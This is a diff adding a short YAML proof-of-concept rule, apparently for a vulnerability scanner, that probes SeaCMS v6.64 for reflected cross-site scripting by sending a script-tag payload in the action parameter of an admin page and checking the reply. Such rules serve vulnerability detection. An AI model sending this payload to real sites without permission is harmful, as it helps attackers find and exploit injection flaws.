@@ -1,0 +1,12 @@
+name: poc-yaml-seacms-v664-xss
+set:
+  rand: randomInt(200000000, 210000000)
+rules:
+  - method: GET
+    path: /adm/admin_video.php?action="><script>alert(rand)</script>
+    expression: |
+      response.body.bcontains(b"rand")
+detail:
+  author: Facker007(https://github.com/Facker007)
+  links:
+    - https://www.anquanke.com/post/id/160904
